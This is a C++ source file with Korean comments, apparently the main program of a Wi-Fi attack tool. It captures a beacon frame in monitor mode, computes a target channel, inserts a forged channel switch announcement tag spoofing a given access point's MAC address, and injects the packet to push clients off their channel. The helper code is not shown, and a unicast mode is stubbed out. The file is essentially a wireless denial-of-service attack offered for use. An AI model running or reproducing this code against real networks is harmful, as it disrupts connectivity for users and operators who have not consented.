
#include <unistd.h>
#include <pcap.h>
#include <iostream>


#include "beacon_frame.h" // 비콘프레임 관련
#include "utils.h" //파일 및 모니터모드 관련

#include <thread> // 동시전송을 위한 쓰레드

#include <cstdlib>  // system 함수 사용을 위해 필요




int main(int argc, char *argv[])
{
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t *handle;

  // gmon 설치 필요!
  start_monitor_mode(argv[1]);

  int chosen = choose_csa(argc, argv);
  const u_char *packet;
  struct pcap_pkthdr *header;

  while (1)
  {
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) 
    {
      fprintf(stderr, "Couldn' Capture': %s\n", errbuf);
        return 0;
    }
    
    int res = pcap_next_ex(handle, &header, &packet);
        
    if (res == 0) {continue;} // 타임아웃 발생
    if (res == -1 || res == -2) 
    {
      fprintf(stderr, "End of pcap file or  pcap_next_ex failed: %s\n", pcap_geterr(handle));
      pcap_close(handle);
      break;
    }

    int Is_Beacon = Distinguish_Beacon(packet);
    
    if (Is_Beacon==1) 
    {
      printf("This IS Beacon\n");
      printf("%d\n", header->caplen); //길이 테스트출력
      break;
    }
  }

  int channel_num = find_beacon_channel(header, packet);
  uint8_t new_channel_num = find_attack_channel(channel_num);
  
  int target_location = find_csa_insertion_location(header, packet);
  printf("channel_num:%d\n", channel_num);
  printf("매치되는 num:%d\n", new_channel_num);
  printf("타겟지점 : %d\n", target_location);


  uint8_t ap_mac[6];
  uint8_t station_mac[6];

  uint8_t *csa_packet = NULL;
  switch(chosen)
  {
    case 1:
      return 0;

    case 2:
      // 맥주소와 데이터 삽입
      convert_mac_address(argv[2], ap_mac);
      csa_packet = insert_broadcast_csa_tag(packet, header->caplen, ap_mac, target_location, new_channel_num);
      send_csa_packet(csa_packet, handle, header->caplen+5);
      return 0;

    case 3:
      convert_mac_address(argv[2], ap_mac);
      convert_mac_address(argv[3], station_mac);
      // insert_unicast_mac(header, packet, ap_mac, station_mac);
      // send_csa(beacon_frame, handle, argv);
      return 0;

    case 4:
      return 0;
  }
}
      
      
